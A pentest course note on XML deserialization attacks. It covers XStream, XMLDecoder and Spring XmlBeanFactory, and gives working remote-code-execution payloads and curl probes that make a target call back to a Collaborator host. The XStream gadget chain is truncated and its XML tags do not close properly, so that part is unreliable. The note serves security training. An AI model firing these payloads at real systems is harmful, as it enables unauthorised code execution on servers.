---
tags: [vapt, deserialization, xml, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.10 XML Deserialization"
---

# 15.10 — XML Deserialization

## XML-Based Serialization

```
BEYOND XXE, XML HAS ANOTHER DANGEROUS SIDE:
XML-based serialization formats that reconstruct objects from XML!

FORMATS:
  Java:  XStream, XMLDecoder, XmlBeanFactory (Spring)
  .NET:  XmlSerializer, DataContractSerializer
  PHP:   Various XML-based ORM serializers
  
THE RISK:
  Like JSON type confusion, these parsers can instantiate
  arbitrary classes from XML input → code execution!
```

---

## Java XStream RCE

```xml
<!-- XStream DESERIALIZES XML TO JAVA OBJECTS: -->
<!-- VULNERABLE CODE:
  XStream xstream = new XStream();
  Object obj = xstream.fromXML(userInput);  // ← DANGEROUS!
-->

<!-- ATTACK PAYLOAD (CVE-2021-39139 and related CVEs): -->
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlSourcedMessage'>
              <tt class='com.sun.xml.internal.ws.util.pipe.StandaloneTubeAssembler$TubelineAssemblerFactoryImpl'/>
              <!-- ... complex gadget chain ... -->
            </message>
          </packet>
        </message>
      </packet>
    </indexMap>
  </comparator>
</default>
```

---

## Java XMLDecoder

```xml
<!-- XMLDecoder EXECUTES JAVA BEANS FROM XML: -->
<!-- VULNERABLE CODE:
  XMLDecoder decoder = new XMLDecoder(inputStream);
  Object obj = decoder.readObject();  // EXECUTES ARBITRARY CODE!
-->

<!-- SIMPLE RCE PAYLOAD: -->
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="3">
        <void index="0"><string>/bin/bash</string></void>
        <void index="1"><string>-c</string></void>
        <void index="2"><string>id</string></void>
      </array>
    </void>
  </object>
</java>

<!-- THIS DIRECTLY CALLS Runtime.getRuntime().exec("id")! -->
<!-- No gadget chain needed — XMLDecoder is inherently dangerous! -->
```

---

## Java Spring XmlBeanFactory

```xml
<!-- Spring XmlBeanFactory can load beans from XML: -->
<!-- VULNERABLE CODE (old Spring):
  XmlBeanFactory bf = new XmlBeanFactory(new UrlResource(userURL));
  OR:
  ClassPathXmlApplicationContext ctx = new ClassPathXmlApplicationContext(userURL);
-->

<!-- IF USER CONTROLS THE XML URL → load from attacker's server: -->
<!-- Attacker hosts beans.xml: -->
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="...">
  <bean id="pb" class="java.lang.ProcessBuilder">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>id</value>
      </list>
    </constructor-arg>
  </bean>
  <bean id="start" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetObject" ref="pb"/>
    <property name="targetMethod" value="start"/>
  </bean>
</beans>

<!-- User provides attacker URL → Spring loads and executes beans! → RCE -->
```

---

## .NET XmlSerializer

```csharp
// XmlSerializer is generally safe for simple types
// BUT: Dangerous if deserializing to object or dynamic types

// SAFE:
XmlSerializer xs = new XmlSerializer(typeof(User));
User u = (User) xs.Deserialize(xmlReader);

// UNSAFE PATTERNS:
// Deserializing to object type with custom IXmlSerializable
// Processing XAML/BAML as XML (see note 15.05)

// TYPE INJECTION IN SOAP:
// If SOAP service uses XmlSerializer with _type hints:
// <TypeSurrogate>System.Windows.Data.ObjectDataProvider</TypeSurrogate>
```

---

## Finding XML Deserialization Endpoints

```bash
# LOOK FOR:
# ✓ SOAP web services (POST to /ws or /service endpoint)
# ✓ REST APIs with application/xml content type
# ✓ File upload accepting XML/config files
# ✓ Spring applications with XML config loading
# ✓ REST-assured or similar frameworks with XML parsing

# IDENTIFY XSTREAM/XMLDECODER:
# Send XMLDecoder payload → does it execute?
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><java><object class="java.lang.Runtime"><void method="exec"><string>curl http://YOUR_COLLAB.burpcollaborator.net/</string></void></object></java>'

# IDENTIFY XSTREAM:
curl -X POST "https://target.com/api/data" \
  -H "Content-Type: application/xml" \
  -d '<dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>curl</string><string>http://YOUR_COLLAB.burpcollaborator.net/</string></command></target><action>start</action></handler></dynamic-proxy>'

# IF COLLABORATOR RECEIVES REQUEST → VULNERABLE!
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[02 - Java Deserialization ysoserial]] — Java gadget chains
- [[Module 14 - XXE]] — XML external entity injection
- [[12 - Defense Avoid Untrusted Deserialization]] — defense
